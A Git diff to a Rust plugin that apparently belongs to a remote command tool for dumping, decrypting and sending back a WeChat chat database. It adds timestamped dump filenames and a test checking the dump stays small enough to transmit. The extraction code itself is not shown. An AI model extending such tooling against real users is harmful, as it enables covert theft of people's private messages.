@@ -76,6 +76,7 @@ impl yizhan_plugin::Plugin for YiZhanDumpWxPlugin {
         &self,
         response: &yizhan_protocol::command::UserCommandResponse,
     ) -> Option<String> {
+        use chrono::Local;
         use yizhan_protocol::command::UserCommandResponse;
 
         match response {
@@ -83,11 +84,15 @@ impl yizhan_plugin::Plugin for YiZhanDumpWxPlugin {
                 if group_id == "dump" && cmd == "db" =>
             {
                 let mut db_file = yizhan_bootstrap::get_program_dir().ok()?;
-                db_file.push("wx-db-dump.zip");
+                let now = Local::now();
+                db_file.push(format!(
+                    "wx-db-dump-{}.zip",
+                    now.format("%Y%m%d%H%M%S").to_string()
+                ));
 
                 std::fs::write(&db_file, bytes).ok()?;
                 Some(format!(
-                    "decrypted file at: {:?}",
+                    "decrypted file at: {}",
                     db_file.to_str().unwrap_or_default()
                 ))
             }
@@ -139,9 +144,19 @@ fn human_readable_size(size: usize) -> (f32, &'static str) {
     (size, units[unit_index])
 }
 
-#[cfg(test)]
+#[cfg(all(test, windows))]
 mod tests {
-    use crate::human_readable_size;
+    use crate::{dump_wx_db, human_readable_size};
+
+    #[test]
+    fn test_dump_wx_db() {
+        let result = dump_wx_db();
+        assert!(result.is_ok());
+
+        let size = result.unwrap().len();
+        // 压缩后的文件大小应该很小，太大了以目前的设计，发送不出去。
+        assert!(size < 10 * 1048576);
+    }
 
     #[test]
     fn test_readable_size() {
